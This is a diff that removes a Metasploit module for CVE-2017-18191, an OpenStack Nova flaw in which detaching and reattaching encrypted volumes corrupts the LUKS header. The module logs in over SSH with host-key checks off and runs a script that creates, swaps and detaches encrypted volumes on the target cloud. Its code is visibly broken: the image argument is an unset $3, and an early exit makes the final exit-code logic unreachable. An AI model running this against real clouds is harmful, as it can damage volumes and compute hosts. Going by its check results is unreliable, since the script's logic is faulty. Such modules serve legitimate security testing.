@@ -1,0 +1,271 @@
+--- cve_2017_18191.rb	2019-05-08 04:45:22.358392876 -0400
++++ /usr/share/metasploit-framework/modules/exploits/linux/ssh/cve_2017_18191.rb	1969-12-31 19:00:00.000000000 -0500
+@@ -1,268 +0,0 @@
+-require 'net/ssh'
+-require 'net/ssh/command_stream'
+-
+-class MetasploitModule < Msf::Exploit::Remote
+-  Rank = GoodRanking
+-
+-  include Msf::Exploit::Remote::SSH
+-
+-  def initialize(info = {})
+-    super(update_info(info,
+-      'Name'           => 'CVE-2017-18191',
+-      'Description'    => %q{
+-      	An issue was discovered in OpenStack Nova 15.x through 15.1.0 and 16.x through 16.1.1. By detaching and reattaching an encrypted volume,
+-        an attacker may access the underlying raw volume and corrupt the LUKS header, 
+-        resulting in a denial of service attack on the compute host. 
+-        (The same code error also results in data loss, but that is not a vulnerability because the user loses their own data.) 
+-        All Nova setups supporting encrypted volumes are affected.	
+-      },
+-      'Author'         => 'jason3e7',
+-      'References'     =>
+-        [
+-          [ 'CVE', '2017-18191' ],
+-        ],
+-      'Platform'       => 'linux',
+-      'Targets'        =>        
+-        [
+-          [ 'Automatic', {} ]
+-        ],
+-      'DefaultTarget' => 0))
+-
+-    register_options(
+-      [
+-        Opt::RHOST(),
+-        Opt::RPORT(22),
+-        OptString.new('ssh_username', [ true, 'target server SSH username', '']),
+-        OptString.new('ssh_password', [ true, 'target server SSH password', '']),
+-        OptString.new('openrc_path', [ true, 'admin-openrc.sh path', 'admin-openrc.sh']),
+-        OptString.new('openrc_password', [ true, 'admin-openrc.sh password', '']),
+-        OptString.new('test_image', [ true, 'OpenStack exist image', ''])
+-      ])
+-    
+-    register_advanced_options(
+-      [
+-        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+-        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
+-      ]
+-    )
+-  end
+-
+-  def rhost
+-    datastore['RHOST']
+-  end
+-
+-  def rport
+-    datastore['RPORT']
+-  end
+-
+-  def do_login(user, pass)
+-    factory = ssh_socket_factory
+-    opts = {
+-      :auth_methods    => ['password', 'keyboard-interactive'],
+-      :port            => rport,
+-      :use_agent       => false,
+-      :config          => true,
+-      :password        => pass,
+-      :proxy           => factory,
+-      :non_interactive => true,
+-      :verify_host_key => :never
+-    }
+-
+-    opts.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+-
+-    begin
+-      ssh = nil
+-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+-        ssh = Net::SSH.start(rhost, user, opts)
+-      end
+-    rescue Rex::ConnectionError
+-      return nil
+-    rescue Net::SSH::Disconnect, ::EOFError
+-      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+-      return nil
+-    rescue ::Timeout::Error
+-      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+-      return nil
+-    rescue Net::SSH::AuthenticationFailed
+-      print_error "#{rhost}:#{rport} SSH - Failed authentication"
+-      return nil
+-    rescue Net::SSH::Exception => e
+-      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+-      return nil
+-    end
+-
+-    if ssh
+-      return ssh
+-    end
+-
+-    return nil
+-  end
+-
+-  def payload
+-    return %Q^
+-openrc_path=#{datastore['openrc_path']}
+-openrc_password=#{datastore['openrc_password']}
+-test_image=#{datastore['test_image']}
+-
+-if [ ! -f $openrc_path ]; then
+-  echo [ERROR] $openrc_path file not found!
+-  exit -1
+-fi
+-
+-source $openrc_path < <(echo $openrc_password)
+-
+-# check nova and cinder exist
+-if [ ! -x "$(command -v nova)" ] || [ ! -x "$(command -v cinder)" ]; then
+-  echo "[ERROR] nova or cinder command not found!"
+-  exit -1
+-fi
+-
+-nova list > /dev/null 2>&1
+-if [ $? -ne 0 ]; then
+-  echo "[ERROR] nova unable to execute!"
+-  exit -1
+-
+-fi
+-cinder list > /dev/null 2>&1
+-if [ $? -ne 0 ]; then
+-  echo "[ERROR] cinder unable to execute!"
+-  exit -1
+-fi
+-
+-echo -e "login success!\n"
+-
+-# create test env
+-create_volume(){
+-  cinder type-create $1
+-  sleep 0.5
+-  cinder encryption-type-create --cipher aes-xts-plain64 --key_size 256 --control_location front-end $1 luks
+-  sleep 0.5
+-  cinder create --volume-type $1 1
+-  sleep 0.5
+-}
+-
+-echo "start create test environment"
+-echo "create volumn..."
+-{
+-create_volume _LUKS_TEST_
+-create_volume _LUKS_NEW_TEST_
+-nova boot --image $3 --flavor 1 _swap_test_
+-} > /dev/null
+-echo "create instance..."
+-sleep 10
+-
+-# test
+-echo -e "\nstart test"
+-instance=`(nova list | grep "_swap_test_" -m1 | cut -d " " -f 2)`
+-vol_luks=`(cinder list | grep "_LUKS_TEST_ " -m1 | cut -d " " -f 2)`
+-vol_luks_new=`(cinder list | grep "_LUKS_NEW_TEST_ " -m1 | cut -d " " -f 2)`
+-sleep 5
+-echo "attach volume"
+-nova volume-attach $instance $vol_luks > /dev/null 
+-sleep 10
+-nova volume-attachments $instance
+-sleep 10
+-echo "update volume"
+-nova volume-update $instance $vol_luks $vol_luks_new
+-sleep 10
+-nova volume-attachments $instance
+-sleep 10
+-
+-echo "detach origin volume"
+-nova volume-detach $instance $vol_luks
+-if [ $? -ne 0 ]; then
+-  sleep 2
+-  echo "detach updated volume"
+-  nova volume-detach $instance $vol_luks_new
+-  if [ $? -eq 0 ]; then
+-    result=1
+-  else
+-    result=-1
+-  fi
+-else
+-  result=0
+-fi
+-echo -e "test finish\n"
+-sleep 3
+-
+-echo "clean test environment..."
+-{
+-nova delete $instance
+-sleep 5
+-cinder delete $vol_luks
+-sleep 1
+-cinder delete $vol_luks_new
+-sleep 1
+-cinder encryption-type-delete _LUKS_TEST_
+-sleep 1
+-cinder encryption-type-delete _LUKS_NEW_TEST_
+-sleep 1
+-cinder type-delete _LUKS_TEST_
+-sleep 1
+-cinder type-delete _LUKS_NEW_TEST_
+-sleep 1
+-} > /dev/null
+-
+-exit $result
+-
+-if [ $result -eq 0 ]; then
+-  exit 1
+-elif [ $result -eq 1 ]; then
+-  exit 0
+-else
+-  exit -1
+-fi
+-^
+-
+-  end 
+-
+-  def check
+-    user = datastore['ssh_username']
+-    pass = datastore['ssh_password']
+-
+-    print_status("#{rhost}:#{rport} - Attempt to login...")
+-    ssh = do_login(user, pass)
+-    if ssh
+-      print_good("#{rhost}:#{rport} - Login Successful ('#{user}:#{pass})")
+-      print_status("#{rhost}:#{rport} - run test shell script")
+-      exit_code = nil
+-      channel = ssh.open_channel do |ch|
+-        ch.exec payload() do |ch, success|
+-          raise "could not execute command" unless success
+-
+-          ch.on_data do |c, data|
+-            puts data
+-          end
+-
+-          ch.on_extended_data do |c, type, data|
+-            puts data
+-          end
+-          
+-          channel.on_request("exit-status") do |ch, data|
+-            exit_code = data.read_long
+-          end
+-        end 
+-      end
+-
+-      channel.wait
+-      print_status("#{rhost}:#{rport} - run test shell script finish")
+-    end
+-
+-    if exit_code == 1
+-      return Exploit::CheckCode::Vulnerable
+-    end    
+-    if exit_code == 0
+-      return Exploit::CheckCode::Safe
+-    end   
+-    return Exploit::CheckCode::Unknown
+-
+-  end
+-
+-  def exploit
+-    fail_with(Failure::None, "Not have exploit")
+-
+-    handler
+-  end
+-
+-end
+-
